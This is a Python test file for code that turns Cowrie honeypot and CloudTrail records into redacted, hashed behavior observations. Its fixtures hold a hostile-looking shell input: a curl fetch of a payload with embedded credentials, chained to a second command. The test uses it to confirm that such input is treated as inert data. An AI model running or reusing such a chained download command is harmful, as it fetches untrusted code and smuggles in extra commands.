import json
from copy import deepcopy
from zipfile import ZipFile

import pytest

from scripts import m7_public_behavior_inputs as behavior
from scripts import m7_public_cloudtrail as cloudtrail
from scripts.evaluate_m6 import canonical, digest


def cloud_event(**changes):
    return {
        "eventID": "event-1", "eventTime": "2025-01-01T00:00:00Z",
        "eventType": "AwsApiCall", "eventSource": "iam.amazonaws.com",
        "eventName": "GetUser", "userIdentity": {
            "type": "IAMUser", "accountId": "123456789012", "principalId": "actor-1",
            "accessKeyId": "ASIA-private-credential",
        },
        "requestParameters": {"userName": "private-user"},
        "should_sample": False, "attack_name": None,
    } | changes


def cowrie_event(**changes):
    return {
        "eventid": "cowrie.command.input", "timestamp": "2025-01-01T00:00:00Z",
        "session": "private-connection", "src_ip": "192.0.2.1",
        "username": "private-user", "password": "private-password",
        "input": "uname -a",
    } | changes


def test_commands_remain_untrusted_data_with_traceable_source_hash(tmp_path):
    marker = tmp_path / "must-not-exist"
    raw = cowrie_event(input=f"curl https://user:secret@192.0.2.4/payload; touch {marker}")
    event = behavior.cowrie_event(raw)

    assert event["id"] == digest(canonical(raw))
    assert event["command"].startswith("curl https://redacted@host_")
    assert event["command"].endswith(f"/payload; touch {marker}")
    assert event["outcome"] == "unknown"
    assert not marker.exists()
    serialized = json.dumps(event)
    for private in ("private-password", "private-user", "private-connection", "192.0.2", "secret@"):
        assert private not in serialized


def test_missing_evidence_is_not_invented_from_normal_activity():
    shell = behavior.cowrie_event(cowrie_event(input="ls -la", username=None, session=None))
    api = behavior.cloudtrail_event(cloud_event(eventType=None, userIdentity={}))
    for event in (shell, api):
        assert event["outcome"] == "unknown"
        assert event["principal_hash"] is None
        assert event["connection_id"] is None
        assert event["error_code"] is None
    assert api["command"] is None
    assert shell["resource_hashes"] == []


@pytest.mark.parametrize(("kind", "outcome"), [
    ("cowrie.login.success", "success"),
    ("cowrie.login.failed", "failure"),
    ("cowrie.command.failed", "failure"),
    ("cowrie.session.file_download", "success"),
])
def test_cowrie_only_reports_explicit_operation_results(kind, outcome):
    event = behavior.cowrie_event(cowrie_event(eventid=kind, destfile="/tmp/payload"))
    assert event["outcome"] == outcome
    assert event["download_path"] == ("/tmp/payload" if "download" in kind else None)
    assert "approved" not in event
    assert "proof" not in event


def test_annotation_changes_do_not_change_observation_or_canonical_record_hash():
    normal = cloud_event()
    threat = normal | {"should_sample": True, "attack_name": "invented_family"}
    assert behavior.cloudtrail_event(normal) == behavior.cloudtrail_event(threat)
    observation = behavior.cloudtrail_event(threat)
    assert observation["id"] == digest(canonical({
        key: value for key, value in normal.items() if key not in cloudtrail.ANNOTATIONS
    }))
    for private in ("should_sample", "attack_name", "invented_family", "private-user", "123456789012"):
        assert private not in json.dumps(observation)


def test_account_namespace_prevents_cross_account_actor_or_resource_linking():
    first = cloud_event()
    second = deepcopy(first)
    second["userIdentity"]["accountId"] = "210987654321"
    first_observation, second_observation = map(behavior.cloudtrail_event, (first, second))
    for key in ("principal_hash", "connection_id", "resource_hashes"):
        assert first_observation[key] != second_observation[key]
    assert behavior.cloudtrail_event(cloud_event(userIdentity={
        "principalId": "unknown", "accessKeyId": "anonymous",
    }))["principal_hash"] is None


def test_cloudtrail_explicit_errors_override_completion_and_labels():
    failed = behavior.cloudtrail_event(cloud_event(responseElements={
        "errorCode": "AccessDenied", "errorMessage": "private detail",
    }))
    assert failed["outcome"] == "failure"
    assert failed["error_code"] == "AccessDenied"
    assert "private detail" not in json.dumps(failed)
    assert behavior.cloudtrail_event(cloud_event())["outcome"] == "success"


def test_s3_target_pseudonyms_keep_same_object_linkage_without_exposing_names():
    raw = cloud_event(requestParameters={"bucketName": "private-bucket", "key": "path/private-key"})
    first = behavior.cloudtrail_event(raw)
    second = behavior.cloudtrail_event(raw | {"eventName": "DeleteObject"})
    another = behavior.cloudtrail_event(raw | {"requestParameters": {
        "bucketName": "private-bucket", "key": "path/other-key",
    }})
    assert first["resource_hashes"] == second["resource_hashes"]
    assert first["resource_hashes"] != another["resource_hashes"]
    assert "private-bucket" not in json.dumps(first)


def test_bounded_text_missing_timestamps_and_annotations_are_rejected():
    with pytest.raises(ValueError, match="text_shape"):
        behavior.cowrie_event(cowrie_event(input="x" * (behavior.MAX_TEXT_CHARS + 1)))
    with pytest.raises(ValueError, match="missing_timestamp"):
        behavior.cloudtrail_event(cloud_event(eventTime=None))
    with pytest.raises(ValueError, match="annotation"):
        behavior.cowrie_event(cowrie_event(expected_label="threat"))


def write_cloud_archive(path, records):
    with ZipFile(path, "w") as archive:
        archive.writestr("events.json", json.dumps({"Records": records}))
    return digest(path.read_bytes())


def test_archive_loader_preserves_grouping_dedup_hashes_and_source_order_on_ties(tmp_path):
    first = cloud_event(eventID="later", eventTime="2025-01-01T00:00:03Z")
    second = cloud_event(eventID="earlier", eventTime="2025-01-01T00:00:01Z")
    third = cloud_event(eventID="tie", eventTime="2025-01-01T00:00:01Z")
    path = tmp_path / "source.zip"
    records = [first, second, third, first]
    checksum = write_cloud_archive(path, records)
    rows, metadata = behavior.load_cloudtrail_behavior(path, expected_sha256=checksum)
    references, _ = cloudtrail.normalize_records(records)

    assert len(rows) == 1
    assert metadata["exact_duplicate_events_removed"] == 1
    assert rows[0]["original_group_id"] == references[0]["original_group_id"]
    assert rows[0]["event_hashes"] == references[0]["event_hashes"]
    assert [event["id"] for event in rows[0]["observation"]["events"]] == [
        behavior.cloudtrail_event(item)["id"] for item in (second, third, first)
    ]
    changed = [record | {"should_sample": True, "attack_name": "changed"} for record in records]
    checksum = write_cloud_archive(path, changed)
    relabeled, _ = behavior.load_cloudtrail_behavior(path, expected_sha256=checksum)
    assert rows[0]["observation"] == relabeled[0]["observation"]
    assert rows[0]["expected_label"] == "normal"
    assert relabeled[0]["expected_label"] == "threat"


def test_archive_loader_rejects_hash_mismatch_and_conflicting_source_ids(tmp_path):
    path = tmp_path / "source.zip"
    checksum = write_cloud_archive(path, [cloud_event(), cloud_event(eventName="DeleteUser")])
    with pytest.raises(ValueError, match="archive_hash"):
        behavior.load_cloudtrail_behavior(path, expected_sha256="0" * 64)
    with pytest.raises(ValueError, match="conflicting_event_id"):
        behavior.load_cloudtrail_behavior(path, expected_sha256=checksum)
